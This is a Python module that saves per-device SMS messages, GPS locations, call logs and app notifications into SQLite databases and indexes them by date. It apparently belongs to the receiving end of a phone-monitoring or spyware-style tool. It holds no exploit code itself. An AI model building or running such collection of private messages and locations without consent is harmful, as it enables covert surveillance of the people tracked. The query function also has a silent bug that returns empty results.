import sqlite3
from pathlib import Path
from datetime import datetime
from collections import defaultdict


def safe_device_name(name: str) -> str:
    return "".join(c if c.isalnum() or c in "-_" else "_" for c in name.strip())[:60]


def get_device_db(device_name: str, base_dir: Path) -> sqlite3.Connection:
    db_path = base_dir / f"{device_name}.db"
    conn = sqlite3.connect(db_path, timeout=10, check_same_thread=False)

    conn.executescript("""
        CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            body TEXT,
            date INTEGER,
            type TEXT,
            UNIQUE(address, body, date)
        );

        CREATE TABLE IF NOT EXISTS gps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude TEXT,
            longitude TEXT,
            accuracy TEXT,
            timestamp INTEGER,
            UNIQUE(timestamp)
        );

        CREATE TABLE IF NOT EXISTS calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            number TEXT,
            call_type TEXT,
            duration INTEGER,
            timestamp INTEGER,
            UNIQUE(number, timestamp, duration)
        );

        CREATE TABLE IF NOT EXISTS notifs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            package TEXT,
            title TEXT,
            text TEXT,
            timestamp INTEGER,
            UNIQUE(package, title, timestamp)
        );
    """)

    conn.commit()
    return conn


def insert_data(conn: sqlite3.Connection, item: str, messages: list) -> tuple[int, int]:
    cur = conn.cursor()
    inserted = skipped = 0

    for row in messages:
        try:
            if item == "sms":
                cur.execute(
                    "INSERT OR IGNORE INTO sms (address, body, date, type) VALUES (?, ?, ?, ?)",
                    (row.get("address"), row.get("body"), row.get("date"), row.get("type", "sms"))
                )
            elif item == "gps":
                cur.execute(
                    "INSERT OR IGNORE INTO gps (latitude, longitude, accuracy, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("latitude"), row.get("longitude"), row.get("accuracy"), row.get("timestamp"))
                )
            elif item == "calls":
                cur.execute(
                    "INSERT OR IGNORE INTO calls (number, call_type, duration, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("number"), row.get("type"), row.get("duration"), row.get("timestamp"))
                )
            elif item == "notifs":
                cur.execute(
                    "INSERT OR IGNORE INTO notifs (package, title, text, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("package"), row.get("title"), row.get("text"), row.get("timestamp"))
                )
            else:
                continue

            inserted += 1 if cur.rowcount == 1 else 0
            skipped += 1 if cur.rowcount == 0 else 0
        except Exception:
            continue

    conn.commit()
    return inserted, skipped


def query_data(conn: sqlite3.Connection, info_type: str, min_ts: int | None) -> list[dict]:
    cur = conn.cursor()
    tables = {"sms": "date", "gps": "timestamp", "calls": "timestamp", "notifs": "timestamp"}
    ts_field = tables.get(info_type)
    if not ts_field:
        return []

    try:
        if min_ts is not None:
            cur.execute(f"SELECT * FROM {info_type} WHERE {ts_field} >= ? ORDER BY {ts_field} DESC", (min_ts,))
        else:
            cur.execute(f"SELECT * FROM {info_type} ORDER BY {ts_field} DESC")
        return [dict(row) for row in cur.fetchall()]
    except Exception:
        return []


def get_log_structure(base_dir: Path) -> dict:
    structure = defaultdict(lambda: defaultdict(lambda: defaultdict(lambda: defaultdict(list))))

    for db_file in base_dir.glob("*.db"):
        device_name = db_file.stem
        conn = sqlite3.connect(db_file)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        for table, ts_field in [("sms", "date"), ("gps", "timestamp"), ("calls", "timestamp"), ("notifs", "timestamp")]:
            try:
                cur.execute(f"SELECT {ts_field} FROM {table} ORDER BY {ts_field} ASC")
                rows = cur.fetchall()
                for row in rows:
                    ts = row[ts_field]
                    if not ts:
                        continue
                    dt = datetime.fromtimestamp(ts / 1000 if ts > 1e10 else ts)
                    year, month, day = str(dt.year), f"{dt.month:02d}", f"{dt.day:02d}"
                    if table not in structure[device_name][year][month][day]:
                        structure[device_name][year][month][day].append(table)
            except Exception:
                continue

        conn.close()

    return structure
